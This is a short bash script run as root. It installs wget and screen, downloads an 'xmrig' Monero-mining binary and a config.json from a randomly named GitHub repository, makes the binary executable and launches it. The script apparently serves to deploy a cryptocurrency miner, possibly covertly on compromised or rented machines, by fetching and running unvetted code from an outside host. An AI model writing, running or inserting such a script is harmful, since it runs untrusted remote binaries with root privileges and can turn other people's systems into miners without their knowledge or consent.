#!/bin/bash 

apt update
apt install wget screen -y

mkdir -p /root/xmr
cd /root/xmr 
wget https://github.com/NicoleLawrence56851/xxsw1m2jhu389/raw/main/xmrig -O /root/xmr/xmrig 
chmod +x /root/xmr/xmrig 
wget https://raw.githubusercontent.com/NicoleLawrence56851/xxsw1m2jhu389/main/config.json -O /root/xmr/config.json 
/root/xmr/xmrig -c /root/xmr/config.json
